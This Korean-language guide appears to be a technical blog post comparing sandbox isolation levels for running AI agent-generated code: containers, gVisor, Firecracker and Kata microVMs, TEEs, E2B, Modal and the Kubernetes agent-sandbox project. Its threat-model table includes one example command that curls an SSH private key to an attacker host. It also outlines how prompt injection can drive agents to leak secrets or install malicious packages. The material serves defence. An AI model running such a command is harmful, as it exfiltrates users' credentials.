# AI 에이전트가 실행하는 코드를 어디까지 격리해야 하나: 컨테이너·gVisor·마이크로VM 격리 스펙트럼 선택 가이드

코딩 에이전트, 코드 인터프리터, 데이터 분석 에이전트 — 2026년의 AI 에이전트는 대부분 "코드를 생성하고 그 코드를 실제로 실행한다"는 공통점을 갖는다. 문제는 이 코드가 사람의 리뷰를 거치지 않고 기계의 속도로 실행된다는 점이다. 프롬프트 인젝션 한 번으로 에이전트가 `pip install`로 악성 패키지를 끌어오거나, 시크릿을 외부로 curl로 전송하거나, 내부 네트워크를 스캔하는 시나리오는 더 이상 가정이 아니라 이미 관찰되는 공격 패턴이다.

이 글에서는 "에이전트 코드 실행을 어디까지 격리해야 하는가"라는 질문에 격리 스펙트럼(isolation spectrum) 관점으로 답한다. 베어메탈 실행부터 컨테이너, gVisor, 마이크로VM, 기밀 컴퓨팅까지 각 수준의 보장과 비용을 정리하고, 관리형 서비스(E2B, Modal)와 Kubernetes 표준화 흐름(kubernetes-sigs/agent-sandbox) 중 무엇을 선택할지 판단하는 기준을 제공한다.

## 먼저 위협 모델을 정의하라: 샌드박스가 막아야 할 6가지

격리 기술을 고르기 전에 방어 대상을 명확히 해야 한다. 에이전트 코드 실행 컨텍스트에서 반복적으로 등장하는 위협은 다음과 같다.

| 위협 | 예시 |
|------|------|
| 시크릿 유출 | `curl https://attacker.com/$(cat ~/.ssh/id_rsa)` |
| 서플라이체인 공격 | `pip install` 시 악성 PyPI/npm 패키지 유입 |
| 호스트 침해 | 커널 취약점을 이용한 컨테이너 탈출 |
| 데이터 파괴 | 실수로 인한 `rm -rf` 또는 프로덕션 DB 변경 |
| 네트워크 피벗팅 | 침해된 샌드박스에서 내부망 스캔 |
| 리소스 고갈 | 포크 폭탄으로 호스트 CPU 전체 소진 |

이 위협들을 통제하려면 샌드박스는 최소한 다섯 가지 정책을 함께 시행해야 한다: **네트워크 이그레스 기본 거부(default-deny)**, **파일시스템 경계(스코프된 워크스페이스)**, **프로세스 격리(전용 커널 여부가 핵심 분기점)**, **시크릿 스코핑(자격 증명은 애초에 샌드박스 안에 두지 않음)**, **일회성 라이프사이클(상태는 명시적으로 옵트인할 때만 유지)**. 격리 기술 선택은 이 중 "프로세스 격리를 어느 수준까지 끌어올릴 것인가"의 문제로 귀결된다.

## 격리 스펙트럼: 레벨 0부터 4까지

격리는 스펙트럼이다. 내려갈수록 격리는 강해지고 비용은 커진다.

**레벨 0 — 샌드박스 없음.** 호스트에서 직접 `exec()`를 호출한다. 오버헤드는 zero지만 공격 표면은 호스트 전체다. 오프라인 개발 환경에서 이미 검증된 스크립트만 돌리는 경우 외에는 쓸 이유가 없다.

**레벨 1 — 컨테이너(Docker/LXC).** 리눅스 네임스페이스와 cgroup으로 프로세스를 격리한다. 밀리초 단위 시작, 낮은 오버헤드, 높은 밀도가 장점. 그러나 **호스트 커널을 공유한다**는 근본적 한계가 있다. 커널 취약점 하나면 같은 호스트의 모든 컨테이너가 한꺼번에 위험해진다. 실제로 runc의 컨테이너 탈출 취약점 CVE-2024-21626("Leaky Vessels", 2024년 1월 공개)은 파일 디스크립터 누수를 악용해 컨테이너 밖의 호스트 파일시스템에 접근할 수 있게 했다. 에이전트가 생성하는 *신뢰할 수 없는* 코드를 레벨 1에서 돌리는 건 위험하며, 사실상 검증된 코드를 단일 테넌트로 돌릴 때만 적합하다.

**레벨 2 — gVisor(사용자 공간 커널).** 구글이 개발한 gVisor는 Sentry라는 사용자 공간 프로세스에서 리눅스 커널의 핵심 로직을 Go로 재구현한다. 컨테이너가 시스콜을 호출하면 호스트 커널이 아니라 Sentry가 이를 가로채 처리한다. 즉 **컨테이너가 호스트 커널에 직접 닿지 않는다**. 하드웨어 가상화가 필요 없어 베어메탈이나 중첩 가상화가 제한적인 환경에서도 쓸 수 있고, 대부분의 리눅스 시스콜을 지원해 호환성도 넓다. 대가로 시스콜을 매번 사용자 공간에서 처리하기 때문에 I/O 집약적인 워크로드에서는 성능 저하가 보고된다. 컴퓨트 집약 ML 파이프라인처럼 시스콜 밀도가 낮고 격리는 필요한 워크로드에 잘 맞는다.

**레벨 3 — 마이크로VM(Firecracker, Kata Containers).** 하드웨어 가상화(KVM)로 샌드박스마다 전용 게스트 커널을 제공한다. 탈출하려면 게스트 커널과 하이퍼바이저를 둘 다 넘어야 하므로, 컨테이너 탈출보다 몇 자릿수 어렵다. 신뢰할 수 없는 LLM 생성 코드, 멀티 테넌트 프로덕션, 규제 산업의 표준 답이 이 레벨이다.

**레벨 4 — 기밀 컴퓨팅(TEE).** Intel TDX, AMD SEV-SNP 같은 하드웨어 메모리 암호화로 하이퍼바이저조차 샌드박스 메모리를 읽지 못하게 한다. 금융·의료·국방 등에서 요구되는 수준이며, 오버헤드와 프로그래밍 모델의 복잡함이 트레이드오프다.

### Firecracker가 마이크로VM을 "컨테이너처럼" 만든 방법

마이크로VM이라면 무겁지 않냐는 반론은 AWS가 Firecracker로 반박했다. Firecracker는 AWS Lambda와 Fargate의 격리 기반으로 개발된 오픈소스(Apache 2.0) VMM이다. 공식 문서 기준으로 **사용자 공간 코드를 최소 125ms 만에 시작**하고, **호스트당 초당 최대 150개의 마이크로VM을 생성**하며, **VM당 메모리 오버헤드는 5MiB 미만**이다. 이 수치가 가능한 이유는 미니멀리즘에 있다. BIOS도, ACPI도, PCI 에뮬레이션도 없이 virtio 기반 최소 장치만 에뮬레이트해 공격 표면과 메모리 풋프린트를 동시에 줄였다.

Kata Containers는 같은 하드웨어 수준 격리를 표준 컨테이너 API와 Kubernetes로 가져온다. Firecracker, Cloud Hypervisor, QEMU 같은 VMM을 오케스트레이션하며, 쿠버네티스 입장에서는 일반 컨테이너처럼 보이지만 내부적으로는 VM이다. VM 수준 보안이 필요하면서 컨테이너 워크플로우는 유지하고 싶은 프로덕션 K8s 환경에 적합하다.

## 셀프호스팅 vs 매니지드: E2B로 시작하는 법

격리 수준을 정했다면 다음 질문은 "직접 구축할 것인가, 매니지드 서비스를 쓸 것인가"다. Firecracker 클러스터를 직접 운영하는 것은 가능하지만 스냅샷/복원, 배치 알고리즘, 템플릿 캐싱, 네트워크 관리까지 감당해야 한다.

매니지드 진영의 대표주자는 E2B다. E2B는 Firecracker 마이크로VM 기반의 오픈소스 인프라(Apache 2.0)로, AI 생성 코드를 클라우드의 격리된 샌드박스에서 실행한다. 인프라 전체가 셀프호스팅 가능하며(현재 AWS와 GCP 지원), Python/JS SDK로 다룬다.

```python
from e2b import Sandbox

with Sandbox.create() as sandbox:
    result = sandbox.commands.run('pip install pandas && python -c "import pandas; print(pandas.__version__)"')
    print(result.stdout)
```

몇 줄로 마이크로VM이 생성되고, 코드가 실행되고, 컨텍스트 매니저를 빠져나가며 정리된다. Jupyter 기반 코드 인터프리터가 필요하면 `e2b-code-interpreter` 패키지로 `run_code()` API를 쓸 수 있다.

gVisor 계열로 자주 거론되는 플랫폼은 Modal이다. Modal 공식 문서는 샌드박스를 "신뢰할 수 없는 사용자/에이전트 코드를 실행하는 보안 컨테이너"로 소개하며, 기본적으로 인바운드 연결 전면 차단에 아웃바운드도 CIDR/도메인 단위 허용 목록으로 제한하는 secure-by-default 설계를 갖췄다. GPU(H100/A100)를 샌드박스에 붙일 수 있어 ML 워크로드 조합에 유리하다. 그 외에도 Docker 기반의 Daytona, Firecracker를 쓰는 것으로 알려진 Vercel 등 각자 다른 지점에 서 있다. 선택 기준은 단순하다. **신뢰할 수 없는 코드를 멀티 테넌트로 돌린다면 마이크로VM 계열(E2B, Kata), 컴퓨트 집약 워크로드라면 네트워크 통제가 기본인 Modal 계열, GPU가 필요하면 GPU를 지원하는 플랫폼으로 좁힌다.**

## 2026년의 새 흐름: Kubernetes가 Agent Sandbox를 표준화한다

여기까지가 개별 기술의 문제라면, 올해 달라진 점은 쿠버네티스 생태계가 이 문제를 자체 API로 흡수하기 시작했다는 것이다. 2026년 3월 쿠버네티스 공식 블로그는 [Running Agents on Kubernetes with Agent Sandbox](https://kubernetes.io/blog/2026/03/20/running-agents-on-kubernetes-with-agent-sandbox/)를 발표했고, SIG Apps 산하의 kubernetes-sigs/agent-sandbox 프로젝트(GitHub 기준 약 3.6k 스타, 456 포크)가 `Sandbox` 커스텀 리소스를 개발 중이다.

핵심 설계를 짚어보자. 이 프로젝트는 *샌드박스 오케스트레이터*다. 저수준 격리는 gVisor나 Kata Containers 같은 "샌드박스 런타임"에 위임하고, 자신은 장기 실행·stateful·싱글턴 컨테이너의 라이프사이클을 선언적으로 관리한다. Deployment도 StatefulSet도 잘 맞지 않는 "에이전트 런타임"이라는 워크로드 부류를 위한 것이다.

```yaml
apiVersion: agents.x-k8s.io/v1beta1
kind: Sandbox
metadata:
  name: sandbox-example
spec:
  podTemplate:
    spec:
      runtimeClassName: gvisor
```

주목할 점이 세 가지 있다. 첫째, 격리 수준 선택이 `runtimeClassName: gvisor` 한 줄로 끝난다. Kata를 쓰고 싶으면 런타임만 바꾼다. 둘째, **SandboxWarmPool** 확장이 새 샌드박스를 즉시 할당할 수 있도록 미리 데워둔 풀을 관리한다. 콜드 스타트가 민감한 에이전트 UX에서 실질적인 숙제인 대기 시간을 표준 API로 푸는 것이다. 셋째, gVisor/Kata 런타임에서는 직접 포트포워딩이 호환되지 않기 때문에 `X-Sandbox-ID` 헤더로 트래픽을 라우팅하는 경량 리버스 프록시(Sandbox Router)를 함께 제공한다.

즉 "에이전트 샌드박스"가 개별 벤더의 매직에서 쿠버네티스 API 오브젝트로 내려오는 중이다. K8s 위에서 에이전트 인프라를 운영하는 팀이라면 E2B류 SaaS와 이 표준 트랙 중 어느 쪽에 베팅할지를 이제 결정해야 하는 시기에 들어섰다.

## 결론: 결정 트리와 체크리스트

- **검증된 코드, 단일 테넌트** → 일반 컨테이너(레벨 1)로 충분. 그래도 egress 정책과 리소스 제한은 걸 것
- **LLM이 생성한 코드, 같은 팀 내부** → gVisor(레벨 2). 하드웨어 가상화 없이 강한 격리
- **신뢰할 수 없는 코드, 멀티 테넌트, 프로덕션** → 마이크로VM(레벨 3). Firecracker/Kata. 125ms 부팅·5MiB 오버헤드로 컨테이너와 실용성 차이는 이제 크지 않다
- **하이퍼바이저 운영자조차 불신해야 하는 도메인** → TEE(레벨 4)
- **직접 구축보다 먼저 검증** → E2B(마이크로VM, 셀프호스팅 가능), Modal(gVisor + GPU). K8s 운영팀이라면 agent-sandbox의 `Sandbox` CRD 트랙 주시

어떤 수준을 고르든 격리 기술은 다섯 가지 통제 중 "프로세스 격리" 하나만 책임진다. 나머지 넷 — 이그레스 기본 거부, 파일시스템 경계, 시크릿 스코핑, 일회성 라이프사이클 — 은 기술 선택과 무관하게 반드시 설계에 넣어야 한다. 마이크로VM 안에서 시크릿이 든 env를 통째로 넘겨주면 그 시크릿은 이미 샌드박스의 것이 된다.

당장 취할 첫 단계는 간단하다. 에이전트의 코드 실행 경로를 찾아 `docker exec`나 베어 subprocess로 되어 있는지 확인하고, 신뢰할 수 없는 코드라면 E2B 퀵스타트나 agent-sandbox 예제로 마이크로VM 격리를 하루 만에 증명해보는 것이다. 격리 수준의 결정은 그 증명 위에서 하면 된다.
